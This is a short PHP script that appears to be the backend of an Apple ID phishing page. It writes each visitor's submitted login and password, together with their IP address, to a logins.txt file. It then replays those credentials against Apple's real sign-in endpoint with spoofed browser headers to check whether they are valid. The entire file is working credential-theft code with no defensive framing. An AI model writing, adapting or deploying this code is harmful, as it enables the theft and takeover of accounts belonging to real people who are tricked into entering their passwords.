<?php
	$address = $_SERVER['REMOTE_ADDR'];
	$login = $_POST['login'];
	$pass = $_POST['password'];

	//opening logins text file for appending new data.
	$file = fopen("logins.txt", "a") or die("Unable to open file!");
	//Writing email and password to logins.txt.
	fwrite($file, $address." ".$login." ".$pass.PHP_EOL);
	//closing logins.txt.
	fclose($file);

	//check login and password
	$url = 'https://idmsa.apple.com/appleauth/auth/signin';
	$data = array(
		'accountName' => $login, 
		'password'    => $pass,
		'rememberMe'  => 'false' 
	);

	$options = array(
	  'http' => array(
	    'header'  => "Content-type: application/json\r\n" . 
	    "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0\r\n" . 
	    "Accept: application/json\r\n" . 
	    "X-Apple-Domain-Id: 1\r\n" . 
	    "X-Apple-Locale: ru_RU\r\n" . 
	    "X-Requested-With: XMLHttpRequest\r\n",
	    'method'  => 'POST',
	    'content' => json_encode($data),
	  ),
	);
	
	$context  = stream_context_create($options);
	$result = file_get_contents($url, false, $context);
	
	if ($result == false) {
		echo "ERROR";
	}
	else {
		echo "OK";
	}
	exit();
?>
